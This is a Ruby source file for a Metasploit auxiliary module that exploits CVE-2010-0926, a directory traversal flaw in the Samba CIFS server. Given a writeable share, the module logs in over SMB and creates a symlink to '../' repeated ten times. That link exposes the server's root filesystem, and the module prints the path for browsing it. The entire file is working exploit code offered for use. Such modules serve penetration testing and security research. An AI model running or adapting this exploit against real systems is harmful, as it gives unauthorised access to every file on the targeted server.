##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Report

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT = Rex::Proto::SMB::Exceptions
  CONST = Rex::Proto::SMB::Constants

  def initialize
    super(
      'Name' => 'Samba Symlink Directory Traversal',
      'Description' => %(
        This module exploits a directory traversal flaw in the Samba
      CIFS server. To exploit this flaw, a writeable share must be specified.
      The newly created directory will link to the root filesystem.
      ),
      'Author' => [
        'kcope', # http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072927.html
        'hdm' # metasploit module
      ],
      'References' => [
        ['CVE', '2010-0926'],
        ['OSVDB', '62145'],
        ['URL', 'http://www.samba.org/samba/news/symlink_attack.html']
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),
      OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])
    ])

    deregister_options('SMB::ProtocolVersion')
  end

  def run
    print_status('Connecting to the server...')
    connect(versions: [1])
    smb_login

    print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
    simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")

    print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
    simple.client.symlink(datastore['SMBTARGET'], '../' * 10)

    print_status('Now access the following share to browse the root filesystem:')
    print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
    print_line('')
  end
end
